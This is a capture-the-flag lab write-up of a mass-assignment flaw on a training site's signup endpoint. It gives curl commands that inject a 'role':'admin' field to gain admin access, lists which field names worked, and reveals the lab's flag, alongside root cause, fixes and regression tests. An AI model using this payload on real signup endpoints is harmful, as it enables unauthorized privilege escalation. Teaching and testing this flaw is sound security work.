# Otex — Mass assignment on signup → `/admin`

**Target:** Voorivex lab (`ulneoki6pr.voorivex-lab.online`)  
**Category:** API Security  
**Date:** 2026-07-11

## Summary

The `/signup` endpoint accepts JSON and binds all supplied fields into the user model. Injecting `"role":"admin"` during registration escalates privileges immediately, granting access to the protected `/admin` path and the flag.

## Reproduction

1. Register with an extra privileged field:

```bash
BASE="https://ulneoki6pr.voorivex-lab.online"

curl -s -c cookies.txt -X POST "$BASE/signup" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@example.com","password":"password123","role":"admin"}'
```

2. Confirm role assignment:

```bash
curl -s -b cookies.txt "$BASE/api/users/me"
```

Expected:

```json
{"user_id":"...","email":"attacker@example.com","role":"admin"}
```

3. Access the protected path:

```bash
curl -s -b cookies.txt "$BASE/admin"
```

Expected: HTTP `200` with flag on the admin page.

## Field testing

| Injected field | Result |
|---|---|
| `role: "admin"` | **Works** — `/admin` returns 200 |
| `isAdmin: true` | Fails — redirect to `/` |
| `admin: true` | Fails |
| `is_admin: true` | Fails |
| `type: "admin"` | Fails |

Only the exact `role` property name matched the server-side model.

## Evidence

- Normal signup returns only `user_id` and `email`; no role echoed.
- Unprivileged users hitting `/admin` receive `302` to `/`.
- After signup with `role: admin`, session cookie grants `/admin` without further steps.
- Home page references `/api/users/me`, useful for confirming escalation.

## Root cause

Signup handler performs unrestricted object binding / mass assignment. The server persists client-supplied `role` instead of forcing a safe default and ignoring privileged attributes.

## Impact

Unauthenticated attacker can self-register as admin and access restricted functionality, including flag disclosure on `/admin`.

## Fix

- Allowlist signup input to `email` and `password` only.
- Assign `role` server-side (`user` by default).
- Strip or reject unknown/privileged fields.
- Enforce authorization on `/admin` from server-stored role, never from client-writable fields.

## Regression test

1. `POST /signup` with `role: admin` must not persist admin.
2. New users must always receive the default non-admin role.
3. `/admin` must return forbidden for default-role accounts.

## Flag

`flag_90b656354815fad2adf243730df81b36`
